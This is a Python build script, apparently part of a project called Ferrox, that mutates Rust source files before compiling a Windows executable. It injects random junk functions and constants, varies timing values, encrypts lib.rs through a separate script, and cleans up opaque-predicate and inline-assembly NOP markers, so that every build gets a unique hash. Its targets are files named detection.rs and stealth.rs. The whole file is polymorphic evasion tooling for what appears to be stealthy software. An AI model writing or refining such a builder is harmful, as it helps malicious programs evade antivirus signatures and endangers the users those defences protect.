#!/usr/bin/env python3
"""
Ferrox Polymorphic Builder
Generates unique builds by injecting junk code, randomizing timing values,
and mutating constants before compilation.
"""

import argparse
import os
import sys
import re
import random
import string
import hashlib
import shutil
import subprocess
from pathlib import Path


class PolymorphicBuilder:
    """
    Transforms Rust source files with polymorphic mutations before building.

    Attributes:
        project_dir: Path - Root of the Rust project.
        src_dir: Path - Source directory.
        backup_dir: Path - Directory for pre-mutation backups.
    """

    def __init__(self, project_dir):
        """
        Args:
            project_dir: Path - Path to the Rust project root.
        """
        self.project_dir = Path(project_dir)
        self.src_dir = self.project_dir / "src"
        self.backup_dir = self.project_dir / "build_backups"
        self.backup_dir.mkdir(exist_ok=True)

    def _random_string(self, length=8):
        """
        Generate a random alphabetic string.

        Args:
            length: int - Number of characters.

        Returns:
            str - Random string.
        """
        return "".join(random.choices(string.ascii_letters, k=length))

    def _backup_file(self, file_path):
        """
        Copy a source file to the backup directory.

        Args:
            file_path: Path - File to back up.

        Returns:
            Path or None - Backup path if successful.
        """
        if not file_path.exists():
            return None
        backup = self.backup_dir / file_path.name
        shutil.copy2(file_path, backup)
        return backup

    def _restore_file(self, file_path, backup_path):
        """
        Restore a file from its backup.

        Args:
            file_path: Path - Original file location.
            backup_path: Path or None - Backup to restore from.
        """
        if backup_path and backup_path.exists():
            shutil.copy2(backup_path, file_path)

    def inject_junk_code(self, file_path):
        """
        Insert random dead functions into a Rust source file.

        Args:
            file_path: Path - Target .rs file.
        """
        content = file_path.read_text(encoding="utf-8")
        junk_functions = []

        for _ in range(random.randint(3, 7)):
            name = f"_{self._random_string(12)}"
            params = ", ".join(f"_{self._random_string(6)}: u32" for _ in range(random.randint(1, 3)))
            ops = []
            for _ in range(random.randint(5, 15)):
                var = f"_{self._random_string(8)}"
                a, b = random.randint(1, 1000), random.randint(1, 1000)
                op = random.choice([
                    f"    let {var} = {a} + {b};",
                    f"    let {var} = {a % 100} * {b % 100};",
                    f"    let {var} = {a % 255} ^ {b % 255};",
                    f"    let {var} = {a} << {random.randint(1, 8)};",
                ])
                ops.append(op)
            last_var = ops[-1].split("let ")[1].split(" =")[0] if ops else "0"
            ops.append(f"    {last_var}")
            body = "\n".join(ops)
            junk_functions.append(
                f"\n#[inline(never)]\n#[allow(dead_code)]\nfn {name}({params}) -> u32 {{\n{body}\n}}"
            )

        lines = content.split("\n")
        insert_pos = 0
        for i, line in enumerate(lines):
            if line.strip().startswith("use ") or line.strip().startswith("mod "):
                insert_pos = i + 1

        lines.insert(insert_pos, "\n".join(junk_functions))
        file_path.write_text("\n".join(lines), encoding="utf-8")

    def randomize_timing(self, file_path):
        """
        Mutate Duration::from_secs and from_millis values.

        Args:
            file_path: Path - Target .rs file.
        """
        content = file_path.read_text(encoding="utf-8")

        def vary_secs(m):
            return f"Duration::from_secs({max(1, int(m.group(1)) + random.randint(-30, 30))})"

        def vary_millis(m):
            return f"Duration::from_millis({max(100, int(m.group(1)) + random.randint(-200, 200))})"

        content = re.sub(r"Duration::from_secs\((\d+)\)", vary_secs, content)
        content = re.sub(r"Duration::from_millis\((\d+)\)", vary_millis, content)
        file_path.write_text(content, encoding="utf-8")

    def randomize_constants(self, file_path):
        """
        Insert random dead constants near existing const declarations.

        Args:
            file_path: Path - Target .rs file.
        """
        lines = file_path.read_text(encoding="utf-8").splitlines()
        modified = False

        for i, line in enumerate(lines):
            if "const " in line and "=" in line and "//" not in line:
                if random.random() < 0.3:
                    junk = f"const _{self._random_string(10)}: u32 = {random.randint(1000, 9999)};"
                    lines.insert(i + 1, junk)
                    modified = True

        if modified:
            file_path.write_text("\n".join(lines), encoding="utf-8")

    def clean_junk_code(self, file_path):
        """
        Remove injected junk functions and constants from a Rust source file.
        Preserves marker comments (//#junk, //#endjunk, //#jcall, //#ultraprotect, //#endultra, //#polymorphnop).

        Args:
            file_path: Path - Target .rs file to clean.
        """
        content = file_path.read_text(encoding="utf-8")
        lines = content.split("\n")
        cleaned_lines = []
        in_junk_block = False
        in_ultraprotect_block = False
        in_polymorphnop_block = False
        skip_next_lines = 0

        i = 0
        while i < len(lines):
            line = lines[i]
            stripped = line.strip()

            # Skip lines if we're in a skip counter
            if skip_next_lines > 0:
                skip_next_lines -= 1
                i += 1
                continue

            # Handle //#junk blocks
            if stripped.startswith("//#junk("):
                cleaned_lines.append(lines[i])
                in_junk_block = True
                i += 1
                continue

            if stripped.startswith("//#endjunk()"):
                cleaned_lines.append(lines[i])
                in_junk_block = False
                i += 1
                continue

            # Skip ALL content inside junk blocks (between //#junk and //#endjunk)
            if in_junk_block:
                i += 1
                continue

            # Handle //#ultraprotect blocks
            if stripped.startswith("//#ultraprotect("):
                cleaned_lines.append(lines[i])
                in_ultraprotect_block = True
                i += 1
                continue

            if stripped.startswith("//#endultra()"):
                cleaned_lines.append(lines[i])
                in_ultraprotect_block = False
                i += 1
                continue

            # Skip generated content inside ultraprotect blocks
            if in_ultraprotect_block:
                i += 1
                continue

            # Handle //#polymorphnop blocks
            if stripped.startswith("//#polymorphnop("):
                cleaned_lines.append(lines[i])
                in_polymorphnop_block = True
                i += 1
                continue

            # Skip generated NOP instructions until we hit a non-asm line
            if in_polymorphnop_block:
                if stripped.startswith("unsafe { asm!("):
                    i += 1
                    continue
                else:
                    in_polymorphnop_block = False

            # Handle //#stackjunk markers - keep marker, skip generated junk variables
            if stripped.startswith("//#stackjunk("):
                cleaned_lines.append(lines[i])
                i += 1
                # Skip all following lines that are junk variables
                while i < len(lines):
                    next_stripped = lines[i].strip()
                    if next_stripped.startswith("let _polymorph_junk_") or next_stripped.startswith("std::hint::black_box("):
                        i += 1
                    else:
                        break
                continue

            # Handle //#opaqueif markers - keep marker, skip ALL consecutive opaque predicate if statements
            if stripped.startswith("//#opaqueif()"):
                cleaned_lines.append(lines[i])
                i += 1
                # Skip all consecutive lines that are opaque predicate if statements
                while i < len(lines):
                    next_stripped = lines[i].strip()
                    if next_stripped.startswith("if crate::polymorph::opaque_predicate") or next_stripped.startswith("if (crate::polymorph::opaque_predicate"):
                        i += 1
                    else:
                        break
                continue

            # Handle //#endopaque markers - keep marker, skip ALL consecutive closing braces
            if stripped.startswith("//#endopaque()"):
                cleaned_lines.append(lines[i])
                i += 1
                # Skip all consecutive lines that are closing braces with unreachable
                while i < len(lines):
                    next_stripped = lines[i].strip()
                    if next_stripped == "} else { unreachable!(); }":
                        i += 1
                    else:
                        break
                continue

            # Handle //#jcall markers - keep the marker, remove the next line (the actual call)
            if stripped.startswith("//#jcall("):
                cleaned_lines.append(lines[i])
                i += 1
                # Skip the next line which should be the junk function call
                if i < len(lines) and "let _ = _" in lines[i]:
                    i += 1
                continue

            # Keep everything else (including //#ultraprotect and //#endultra markers)
            cleaned_lines.append(lines[i])
            i += 1

        file_path.write_text("\n".join(cleaned_lines), encoding="utf-8")

    def clean_all(self):
        """
        Clean junk code from all target source files.

        Returns:
            int - Number of files cleaned.
        """
        target_files = [
            self.src_dir / "main.rs",
            self.src_dir / "detection.rs",
            self.src_dir / "stealth.rs",
        ]

        cleaned_count = 0
        for fp in target_files:
            if fp.exists():
                print(f"Cleaning {fp.name}...")
                self.clean_junk_code(fp)
                cleaned_count += 1

        print(f"Cleaned {cleaned_count} files.")
        return cleaned_count

    def build(self):
        """
        Run the full polymorphic build pipeline: backup, mutate, build, restore.

        Returns:
            int - Process exit code.
        """
        target_files = [
            self.src_dir / "main.rs",
            self.src_dir / "detection.rs",
            self.src_dir / "stealth.rs",
        ]

        backups = {}
        try:
            for fp in target_files:
                if fp.exists():
                    backups[fp] = self._backup_file(fp)

            pycrypt = self.project_dir / "pycrypt.py"
            if pycrypt.exists():
                subprocess.run(
                    [sys.executable, str(pycrypt), str(self.src_dir / "lib.rs")],
                    cwd=self.project_dir, check=True,
                )

            for fp in target_files:
                if not fp.exists():
                    continue
                if random.random() < 0.7:
                    self.inject_junk_code(fp)
                if random.random() < 0.8:
                    self.randomize_timing(fp)
                if random.random() < 0.5:
                    self.randomize_constants(fp)

            result = subprocess.run(
                [sys.executable, "build.py"],
                cwd=self.project_dir,
            )

            if result.returncode == 0:
                exe = self.project_dir / "target" / "x86_64-pc-windows-msvc" / "release" / "ferrox.exe"
                if exe.exists():
                    h = hashlib.sha256(exe.read_bytes()).hexdigest()[:16]
                    print(f"Unique build complete. SHA256: {h}...")

            return result.returncode

        except Exception as e:
            print(f"Polymorphic build failed: {e}")
            return 1

        finally:
            for fp, bp in backups.items():
                self._restore_file(fp, bp)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ferrox Polymorphic Builder")
    parser.add_argument(
        "--clean",
        action="store_true",
        help="Remove injected junk code from source files (keeps comments)"
    )
    args = parser.parse_args()

    project = Path(__file__).parent.parent
    if not project.exists():
        print(f"Project directory not found: {project}")
        sys.exit(1)

    builder = PolymorphicBuilder(project)

    if args.clean:
        builder.clean_all()
        sys.exit(0)
    else:
        sys.exit(builder.build())
